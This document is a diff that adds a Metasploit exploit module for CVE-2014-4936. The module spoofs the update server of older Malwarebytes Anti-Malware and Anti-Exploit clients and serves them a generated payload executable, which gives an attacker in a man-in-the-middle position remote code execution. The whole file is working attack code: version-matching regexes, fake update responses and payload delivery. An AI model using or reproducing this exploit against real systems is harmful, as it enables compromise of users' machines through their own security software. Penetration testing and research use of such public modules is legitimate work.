@@ -1,0 +1,126 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = GoodRanking # Would be Great except MBAE doesn't version check
+
+  include Msf::Exploit::EXE
+  include Msf::Exploit::Remote::HttpServer
+
+  VERSION_REGEX = /\/v2\/(mbam|mbae)\/consumer\/version.chk/
+  EXE_REGEX     = /\/v2\/(mbam|mbae)\/consumer\/data\/(mbam|mbae)-setup-(.*)\.exe/
+  NEXT_VERSION  = { mbam: '2.0.3.1025', mbae: '1.04.1.1012' }
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Malwarebytes Anti-Malware and Anti-Exploit Update Remote Code Execution',
+      'Description'    => %q{
+        This module exploits a vulnerability in the update functionality of
+        Malwarebytes Anti-Malware consumer before 2.0.3 and Malwarebytes
+        Anti-Exploit consumer 1.03.1.1220.
+        Due to the lack of proper update package validation, a man-in-the-middle
+        (MITM) attacker could execute arbitrary code by spoofing the update server
+        data-cdn.mbamupdates.com and uploading an executable. This module has
+        been tested successfully with MBAM 2.0.2.1012 and MBAE 1.03.1.1220.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Yonathan Klijnsma',  # Vulnerability discovery and PoC
+          'Gabor Seljan',       # Metasploit module
+          'todb'                # Module refactoring
+        ],
+      'References'     =>
+        [
+          [ 'CVE', '2014-4936' ],
+          [' OSVDB', '116050'],
+          [ 'URL', 'http://blog.0x3a.com/post/104954032239/cve-2014-4936-malwarebytes-anti-malware-and'] # Discoverer's blog
+        ],
+      'DefaultOptions' =>
+        {
+          'EXITFUNC' => 'process'
+        },
+      'Platform'       => 'win',
+      'Targets'        =>
+        [
+          [ 'Windows Universal', {} ]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => 'Dec 16 2014',
+      'DefaultTarget'  => 0
+    ))
+
+    register_options(
+      [
+        OptPort.new('SRVPORT', [ true, "The daemon port to listen on (do not change)", 80 ]),
+        OptString.new('URIPATH', [ true, "The URI to use (do not change)", "/" ])
+      ], self.class)
+
+    # Vulnerable Malwarebytes clients do not allow altering these.
+    deregister_options('SSL', 'SSLVersion', 'SSLCert')
+  end
+
+  def on_request_uri(cli, request)
+    case request.uri
+    when VERSION_REGEX
+      serve_update_notice(cli) if set_exploit_target($1, request)
+    when EXE_REGEX
+      serve_exploit(cli)
+    else
+      vprint_status "Sending empty page for #{request.uri}"
+      serve_default_response(cli)
+    end
+  end
+
+  def serve_default_response(cli)
+    send_response(cli, '')
+  end
+
+  def check_client_version(request)
+    return false unless request['User-Agent'] =~ /base:(\d+\.\d+\.\d+\.\d+)/
+    this_version = $1
+    next_version = NEXT_VERSION[:mbam]
+    if
+      Gem::Version.new(next_version) >= Gem::Version.new(this_version)
+      return true
+    else
+      print_error "Version #{this_version} of Anti-Malware isn't vulnerable, not attempting update."
+      return false
+    end
+  end
+
+  def set_exploit_target(package, request)
+    case package
+    when /mbam/i
+      if check_client_version(request)
+        @client_software = ['Anti-Malware', NEXT_VERSION[:mbam]]
+      else
+        serve_default_response(cli)
+        return false
+      end
+    when /mbae/i
+      # We don't get identifying info from MBAE
+      @client_software = ['Anti-Exploit', NEXT_VERSION[:mbae]]
+    end
+  end
+
+  def serve_update_notice(cli)
+    software,next_version = @client_software
+    print_status "Updating #{software} to (fake) #{next_version}. The user may need to click 'OK'."
+    send_response(cli, next_version,
+                  'Content-Type' => 'application/octet-stream'
+                 )
+  end
+
+  def serve_exploit(cli)
+    print_status "Sending payload EXE..."
+    send_response(cli, generate_payload_exe,
+                  'Content-Type' => 'application/x-msdos-program'
+                 )
+  end
+
+end
